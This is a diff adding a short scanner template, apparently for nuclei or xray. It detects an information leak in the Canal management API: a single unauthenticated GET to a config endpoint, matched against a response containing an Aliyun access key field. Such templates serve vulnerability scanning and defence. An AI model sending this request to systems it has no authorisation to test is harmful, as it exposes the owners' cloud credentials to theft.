@@ -1,0 +1,20 @@
+id: poc-yaml-canal-info-leak
+info:
+  name: Canal 管理 API 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - method: GET
+    path:
+      - "/api/v1/canal/config/1/0"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"code\":20000,\"message\""
+          - "canal.aliyun.accessKey"
